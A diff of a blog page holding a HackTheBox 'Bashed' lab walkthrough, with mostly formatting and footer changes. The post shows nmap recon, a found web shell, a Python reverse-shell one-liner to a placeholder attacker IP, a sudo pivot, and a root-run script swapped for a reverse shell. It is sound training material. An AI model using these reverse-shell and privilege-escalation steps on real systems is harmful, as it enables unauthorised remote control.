@@ -57,7 +57,7 @@ Recon As usual with a HackTheBox target system, all you have at the onset is a n
   },
   "genre": "post",
   "keywords": "Linux, HackTheBox",
-  "wordcount":  1326 ,
+  "wordcount":  1325 ,
   "url": "https:\/\/securingthe.net\/post\/hackthebox-bashed\/",
   "datePublished": "2018-05-05T02:47:50\x2b00:00",
   "dateModified": "2018-05-05T02:47:50\x2b00:00",
@@ -167,16 +167,10 @@ Recon As usual with a HackTheBox target system, all you have at the onset is a n
           
           
 
-          
-
-<p>As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker.  The best way to learn is by doing, and one of my favorite ways to practice is <a href="https://hackthebox.eu" rel="nofollow noreferrer" target="_blank">HackTheBox</a>.</p>
-
+          <p>As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker.  The best way to learn is by doing, and one of my favorite ways to practice is <a href="https://hackthebox.eu">HackTheBox</a>.</p>
 <p>The machine named <em>Bashed</em> was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.</p>
-
 <h1 id="recon">Recon</h1>
-
 <p>As usual with a HackTheBox target system, all you have at the onset is a name and IP address. My starting point is usually an nmap scan against the target machine&rsquo;s IP.</p>
-
 <pre><code>nmap -sC -sV -oA nmap 10.10.10.68
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:05 EST
 Nmap scan report for 10.10.10.68
@@ -188,10 +182,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: Arrexel's Development Site
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 16.71 seconds
-</code></pre>
-
-<p>Ok, TCP 80 / HTTP is listening.  There are several options for investigating further, but before opening a web browser I continued with nmap and ran the http-enum script.</p>
-
+</code></pre><p>Ok, TCP 80 / HTTP is listening.  There are several options for investigating further, but before opening a web browser I continued with nmap and ran the http-enum script.</p>
 <pre><code>nmap --script http-enum 10.10.10.68
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:07 EST
 Nmap scan report for 10.10.10.68
@@ -207,45 +198,23 @@ PORT   STATE SERVICE
 |   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
 |_  /uploads/: Potentially interesting folder
 Nmap done: 1 IP address (1 host up) scanned in 46.16 seconds
-</code></pre>
-
-<p>The /dev directory contains a couple of scripts.  Visiting <a href="http://10.10.10.68/dev/phpbash.php" rel="nofollow noreferrer" target="_blank">http://10.10.10.68/dev/phpbash.php</a> in a browser presented me with a web shell (!).  I&rsquo;m able to navigate the file structure and read the contents of /home.  Getting user.txt is a simple exercise at this point.</p>
-
+</code></pre><p>The /dev directory contains a couple of scripts.  Visiting http://10.10.10.68/dev/phpbash.php in a browser presented me with a web shell (!).  I&rsquo;m able to navigate the file structure and read the contents of /home.  Getting user.txt is a simple exercise at this point.</p>
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/content/images/2018/05/bashed_user.png" alt="bashed_user" class="lazyload"><figcaption class="image-caption">bashed_user</figcaption></figure></p>
-
 <p><strong>user = owned</strong></p>
-
 <h1 id="gaining-a-foothold">Gaining a Foothold</h1>
-
 <p>I need to get a &ldquo;real&rdquo; shell on the box to go any further. I choose one of my favorite reverse shell one-liners and see if it will work from the PHP web shell.</p>
-
 <p>First, I&rsquo;ll need a listener on my local attacker machine:</p>
-
 <pre><code>nc -v -n -l -p 4444
-</code></pre>
-
-<p>Now I drop this python script directly in the web shell.  The ampersand (&amp;) at the end just backgrounds the process.</p>
-
+</code></pre><p>Now I drop this python script directly in the web shell.  The ampersand (&amp;) at the end just backgrounds the process.</p>
 <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;my HTB IP address&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &amp;
-</code></pre>
-
-<p>Note that the field &ldquo;my HTB IP address&rdquo; would be the 10.10.x.x IP assigned to the VPN interface on my machine (usually tap0 on Kali Linux) when I&rsquo;m connected to the HTB environment, and the port number (4444) is the same one I used to start the netcat listener in the previous step.</p>
-
+</code></pre><p>Note that the field &ldquo;my HTB IP address&rdquo; would be the 10.10.x.x IP assigned to the VPN interface on my machine (usually tap0 on Kali Linux) when I&rsquo;m connected to the HTB environment, and the port number (4444) is the same one I used to start the netcat listener in the previous step.</p>
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/content/images/2018/05/bashed_revshell1.png" alt="bashed_revshell1" class="lazyload"><figcaption class="image-caption">bashed_revshell1</figcaption></figure></p>
-
 <p>Now I have a reverse shell on the target system, but it&rsquo;s still limited. I try using python again to escape to a bash shell.</p>
-
 <pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
-</code></pre>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/content/images/2018/05/bashed_revshell2.png" alt="bashed_revshell2" class="lazyload"><figcaption class="image-caption">bashed_revshell2</figcaption></figure></p>
-
+</code></pre><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/content/images/2018/05/bashed_revshell2.png" alt="bashed_revshell2" class="lazyload"><figcaption class="image-caption">bashed_revshell2</figcaption></figure></p>
 <p>Great, now I&rsquo;m at a more typical shell as user www-data.  Time to enumerate.</p>
-
 <h1 id="enumeration">Enumeration</h1>
-
 <p>I checked many many things, but looking at sudo capabilities turned up some useful information.</p>
-
 <pre><code>www-data@bashed:/var/www/html/dev$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on bashed:
@@ -253,24 +222,16 @@ Matching Defaults entries for www-data on bashed:
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
-</code></pre>
-
-<p>So, my current user (www-data) can run ALL commands as user scriptmanager with no password? I decide to try becoming scriptmanager.</p>
-
+</code></pre><p>So, my current user (www-data) can run ALL commands as user scriptmanager with no password? I decide to try becoming scriptmanager.</p>
 <pre><code>www-data@bashed:/var/www/html/dev$ sudo -i -u scriptmanager
 sudo -i -u scriptmanager
 scriptmanager@bashed:~$
-</code></pre>
-
-<p>From the <a href="https://www.sudo.ws/man/1.8.3/sudo.man.html" rel="nofollow noreferrer" target="_blank">sudo man page</a>:</p>
-
+</code></pre><p>From the <a href="https://www.sudo.ws/man/1.8.3/sudo.man.html">sudo man page</a>:</p>
 <blockquote>
 <p>-i [command]
 The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell&rsquo;s -c option. ==If no command is specified, an interactive shell is executed.== sudo attempts to change to that user&rsquo;s home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use.</p>
 </blockquote>
-
 <p>Bingo, now I&rsquo;m scriptmanager.  More enumeration.</p>
-
 <pre><code>scriptmanager@bashed:/var/www/html/dev$ ls -l /
 ls -l /
 total 80
@@ -297,10 +258,7 @@ drwxrwxrwt  10 root          root           4096 Jan 12 21:07 tmp
 drwxr-xr-x  10 root          root           4096 Dec  4 11:13 usr
 drwxr-xr-x  12 root          root           4096 Dec  4 11:20 var
 lrwxrwxrwx   1 root          root             29 Dec  4 11:14 vmlinuz -&gt; boot/vmlinuz-4.4.0-62-generic
-</code></pre>
-
-<p>Strange, <code>scripts</code> isn&rsquo;t a typical top-level directory and it&rsquo;s owned by scriptmanager. I move into the directory and investigate further.</p>
-
+</code></pre><p>Strange, <code>scripts</code> isn&rsquo;t a typical top-level directory and it&rsquo;s owned by scriptmanager. I move into the directory and investigate further.</p>
 <pre><code>scriptmanager@bashed:/scripts$ ls -al
 ls -al
 total 16
@@ -308,40 +266,24 @@ drwxrwxr--  2 scriptmanager scriptmanager 4096 Apr 20 08:14 .
 drwxr-xr-x 23 root          root          4096 Dec  4 13:02 ..
 -rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4 17:03 test.py
 -rw-r--r--  1 root          root            12 Apr 20 08:18 test.txt
-</code></pre>
-
-<p>Examining these two files leads me to believe that <code>test.txt</code> containts output from the <code>test.py</code> script.  However,<code>test.txt</code> is owned by root while the directory it resides in and the <code>test.py</code> script that generates it are owned by scriptmanager.</p>
-
+</code></pre><p>Examining these two files leads me to believe that <code>test.txt</code> containts output from the <code>test.py</code> script.  However,<code>test.txt</code> is owned by root while the directory it resides in and the <code>test.py</code> script that generates it are owned by scriptmanager.</p>
 <p>This implies that root is executing the script as itself, so the output is written with root ownership. If I can replace <code>test.py</code> with my own malicious version I can do something on the target machine with root privileges. Reverse shell time!</p>
-
 <h1 id="privilege-escalation">Privilege Escalation</h1>
-
 <pre><code>scriptmanager@bashed:/scripts$ mv test.py old-test.py
 scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;my HTB IP address&gt;&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &gt; test.py
-</code></pre>
-
-<p>Here I moved/renamed the existing <code>test.py</code> and created my own with the reverse shell code. This isn&rsquo;t necessary, you could just add the reverse shell bits to the end of the existing file.</p>
-
+</code></pre><p>Here I moved/renamed the existing <code>test.py</code> and created my own with the reverse shell code. This isn&rsquo;t necessary, you could just add the reverse shell bits to the end of the existing file.</p>
 <p>Again note the &ldquo;my HTB IP address field&rdquo; and port number. I want a second reverse shell that&rsquo;s separate from the one I&rsquo;m currently working in, so I selected a new port (5555).</p>
-
 <p>I&rsquo;m not exactly sure how or when root executes the <code>test.py</code> script.  Given the autonomous nature of these HTB systems I assume it&rsquo;s just a cron job. I start a netcat listener on this new port on my local attacker machine and wait.</p>
-
 <p>After a few minutes&hellip;</p>
-
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/content/images/2018/05/94582eeb-e301-49ba-9bf2-64769b24438c.png" alt="94582eeb-e301-49ba-9bf2-64769b24438c" class="lazyload"><figcaption class="image-caption">94582eeb-e301-49ba-9bf2-64769b24438c</figcaption></figure></p>
-
 <p><strong>root = owned</strong></p>
-
 <h1 id="conclusion">Conclusion</h1>
-
 <p>Looking back Bashed was a pretty simple machine, but there were two primary lessons I learned from it:</p>
-
 <ol>
 <li>Look at the simple or obvious things first.  Don&rsquo;t assume every target is going to require some elaborate, complicated method to exploit.</li>
-<li>Enumerate (a lot) and review the details carefully. It took me way too long to notice the permissions on <code>test.txt</code> and <code>test.py</code></li>
+<li>Enumerate (a lot) and review the details carefully. It took me way too long to notice the permissions on <!-- raw HTML omitted -->test.txt<!-- raw HTML omitted --> and <!-- raw HTML omitted -->test.py<!-- raw HTML omitted --></li>
 </ol>
-
-<p>Did you conquer Bashed using some other method?  Feel free to reach out to me on <a href="https://twitter.com/aj_mcquay" rel="nofollow noreferrer" target="_blank">Twitter</a>, I&rsquo;d love to talk about it.</p>
+<p>Did you conquer Bashed using some other method?  Feel free to reach out to me on <a href="https://twitter.com/aj_mcquay">Twitter</a>, I&rsquo;d love to talk about it.</p>
 
     </div>
 
@@ -355,7 +297,7 @@ scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket
            
             <p class="copyright-item">
                     <span>Words:</span>
-                   <span>1326</span>
+                   <span>1325</span>
             </p>
             
             <p class="copyright-item">
@@ -439,30 +381,22 @@ scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket
     <div class="post-comment">
           
           <div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "ajmcquay" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-
-
+  <script type="text/javascript">
+      (function() {
+          
+          
+          if (window.location.hostname == "localhost")
+              return;
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          var disqus_shortname = 'ajmcquay';
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
 
  
-
 
           
     </div>
@@ -473,13 +407,13 @@ scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket
     <div class="copyright">
         &copy;
         
-        <span itemprop="copyrightYear">2018 - 2019</span>
+        <span itemprop="copyrightYear">2018 - 2020</span>
         
          
-            <span class="author" itemprop="copyrightHolder"><a href="https://securingthe.net">AJ McQuay</a></span>
+            <span class="author" itemprop="copyrightHolder"><a href="https://securingthe.net">AJ McQuay</a> | </span>
          
 
-		  
+		 
     </div>
 </footer>
 
@@ -495,7 +429,7 @@ scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket
 
 
     
-     <link href="//lib.baomitu.com/lightgallery/1.6.12/css/lightgallery.min.css" rel="stylesheet">  
+    <link crossorigin="anonymous" integrity="sha384-yziQACfvCVwLqVFLqkWBYRO3XeA4EqzfXKGwaWnenYn5XzqfJFlFdKEmvutIQdKb" href="https://lib.baomitu.com/lightgallery/1.6.12/css/lightgallery.min.css" rel="stylesheet">
       
      <script src="/js/vendor_gallery.min.js" async="" ></script>
     
